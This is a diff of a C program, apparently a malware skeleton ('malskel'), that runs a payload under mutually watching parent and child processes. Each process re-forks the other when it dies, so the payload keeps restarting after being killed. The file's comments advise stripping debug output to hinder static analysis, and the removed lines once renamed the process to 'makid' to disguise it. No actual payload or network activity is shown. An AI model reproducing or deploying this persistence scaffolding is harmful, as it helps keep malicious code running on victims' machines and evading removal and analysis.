@@ -6,11 +6,6 @@
 // To make static binary analysis more difficult consider:
 // - removing all DEBUG print statements
 
-// Important note:
-// Let's say that process P1 has threads A and B
-// Forking inside of P1->A will create a copy of P1->A
-// It will not create a copy of P1->B
-
 #include <pthread.h>
 #include <stdio.h>
 #include <stdbool.h>
@@ -23,6 +18,8 @@
 // lets monitor() know how to respond to a dead process
 #define MONITOR 1
 #define PAYLOAD 2
+
+// sleep for NAP_TIME before checking on the process being monitored
 #define NAP_TIME 1
 
 #define DEBUG if( true == bDebug )
@@ -42,6 +39,7 @@ typedef struct monitor_args {
 void* monitor(void *arg);
 void* payload(void *arg);
 payload_args* get_payload_args(int argc, char *argv[], int iStart);
+monitor_args* new_monitor_args(int iMode, int pid_monitor, payload_args* ppa);
 
 int main(int argc, char *argv[]) {
 
@@ -66,17 +64,14 @@ int main(int argc, char *argv[]) {
     // child: execute payload and monitor the parent
     else if( 0 == pid ) {
 
-        strcpy(argv[0], "makid");
-        sleep(1);
-
         // execute the payload
         pthread_create(&tid_payload, (void*)NULL, payload, (void*)ppa);
         DEBUG fprintf(stderr, "    Thread (payload->payload): tid = %ld from pid = %d\n", tid_payload, getpid());
 
         // monitor the parent
         pid_t pid_parent = getppid();
-        monitor_args ma = { PAYLOAD, pid_parent, ppa };
-        pthread_create(&tid_monitor, (void*)NULL, monitor, &ma);
+        monitor_args* pma = new_monitor_args(PAYLOAD, pid_parent, ppa);
+        pthread_create(&tid_monitor, (void*)NULL, monitor, pma);
         DEBUG fprintf(stderr, "    Thread (payload->monitor): tid = %ld from pid = %d\n", tid_monitor, getpid());
 
         pthread_join(tid_payload, (void*)NULL);
@@ -86,17 +81,10 @@ int main(int argc, char *argv[]) {
     // parent: monitor the the child (payload)
     else {
 
-        monitor_args ma = { MONITOR, pid, ppa };
-        pthread_create(&tid_monitor, (void*)NULL, monitor, &ma);
-        DEBUG fprintf(stderr, "    Thread (monitor->monitor): tid = %ld from pid = %d\n", tid_monitor, getpid());
-        pthread_join(tid_monitor, (void*)NULL);
-
+        monitor_args* pma = new_monitor_args(MONITOR, pid, ppa);
+        monitor(pma);
         while( -1 != wait(NULL) );
-
-        /*
-        monitor_args ma = { MONITOR, pid };
-        monitor(&ma);
-        */
+        
     }
 }
 
@@ -139,28 +127,14 @@ void* monitor(void *arg) {
                 // - monitor thread
                 // - payload thread
 
-                // WORKS! Dead process is detected
-                // payload_args
-                // fork -> payload thread AND monitor thread
-
                 // child process (switch to PAYLOAD mode)
                 if( 0 == pid ) {
                     
-                    DEBUG fprintf(stderr, "- monitor(): BEFORE\n");
                     ma.iMode = PAYLOAD;         // the current process switches to PAYLOAD mode
                     ma.pid_monitor = getppid(); // monitor the parent which is in MONITOR mode
 
-                    // idk why, but pthread_create makes it to where there is only one malskel in task manager
-                    // if you take away pthread_create, you can see 2 malskels in the task manager
-
-                    if( NULL == ma.ppa ) {
-                        DEBUG fprintf(stderr, "ERROR: monitor(): ma.ppa is NULL\n");
-                    }
-
                     pthread_create(&tid_new_payload, (void*)NULL, payload, (void*)ma.ppa);
                     pthread_detach(tid_new_payload);
-                    // pthread_join(tid_new_payload, (void*)NULL);
-                    DEBUG fprintf(stderr, "- monitor(): AFTER\n");
                 }
 
                 // parent process (remain in MONITOR mode))
@@ -182,10 +156,6 @@ void* monitor(void *arg) {
                 // A new process in MONITOR mode needs to be created
                 // The new process will only monitor, so there is no need for threads
 
-                // WORKS! Dead process is detected
-                // monitor_args
-                // fork -> call monitor (no need for a thread)
-
                 // child process (switch to MONITOR mode)
                 if( 0 == pid ) {
                     
@@ -202,6 +172,7 @@ void* monitor(void *arg) {
 
             // unexpected behavior
             else {
+
                 DEBUG fprintf(stderr, "Unexpected behavior\n");
                 exit(-1);
             }
@@ -211,29 +182,16 @@ void* monitor(void *arg) {
         sleep(NAP_TIME);
     }
 
-    DEBUG fprintf(stderr, "EXITED payload(): pid = %d\n", getpid());
     return NULL;
 }
 
 void* payload(void *arg) {
-
-    // REMOVE ME LATER
-    // REMOVE ME LATER
-    // REMOVE ME LATER
-    if( NULL == arg ) {
-        DEBUG fprintf(stderr, "ERROR: payload(): arg is NULL\n");
-    }
 
     // process arg
     payload_args pa = *((payload_args*)arg);
 
     int argc = pa.argc;
     char** argv = pa.argv;
-
-    // -- remove later --
-    // WORKS! Arguments are received
-    // fprintf(stderr, "Payload: argc = %d\n", argc);
-    // fprintf(stderr, "Payload: argv[0] = %s\n", argv[0]);
 
     DEBUG fprintf(stderr, "Payload: pid = %d\n", getpid());
 
@@ -274,8 +232,7 @@ payload_args* get_payload_args(int argc, char *argv[], int iUsed) {
     }
 
     // make the char** point to the arguments in argv
-
-    // argv[0] + iUsed = starting index of payload args
+    // <1 for argv[0]> + iUsed = starting index of payload args
     int iOffset = 1 + iUsed;
     int i;
     for( i = 0 ; i < iPayloadArgs ; i++ ) {
@@ -289,9 +246,18 @@ payload_args* get_payload_args(int argc, char *argv[], int iUsed) {
     return ppa;
 }
 
-/*
 monitor_args* new_monitor_args(int iMode, int pid_monitor, payload_args* ppa) {
 
-    monitor_args* = (monitor_args*)malloc(sizeof(monitor))
+    monitor_args* pma = (monitor_args*)malloc(sizeof(monitor_args));
+
+    if( NULL == pma ) {
+
+        DEBUG fprintf(stderr, "Error: Malloc for pma failed\n");
+        exit(-1);
+    }
+
+    pma->iMode = iMode;
+    pma->pid_monitor = pid_monitor;
+    pma->ppa = ppa;
+    return pma;
 }
-*/
